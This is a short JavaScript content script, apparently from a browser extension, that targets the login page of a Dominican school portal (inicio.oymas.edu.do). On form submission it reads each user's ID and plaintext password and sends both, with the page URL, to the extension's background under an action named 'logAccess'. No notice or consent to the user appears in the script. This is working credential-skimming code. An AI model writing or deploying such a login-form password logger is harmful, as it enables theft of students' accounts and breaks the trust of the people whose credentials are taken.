// klk
(function() {
  'use strict';

  if (window.location.href.startsWith("https://inicio.oymas.edu.do/")) {
    const inputUser = document.querySelector("#username");   
    const inputPass = document.querySelector("#password");   
    const form = document.querySelector("form");

    if (form && inputUser && inputPass) {
      form.addEventListener("submit", () => {
        const matricula = inputUser.value.trim();
        const clave = inputPass.value.trim();

        
        chrome.runtime.sendMessage({
          action: "logAccess",
          matricula,
          clave,
          url: window.location.href
        });

        // Marcar que hubo login
        chrome.storage.local.set({ justLoggedIn: true });
      });
    }
  }
})();
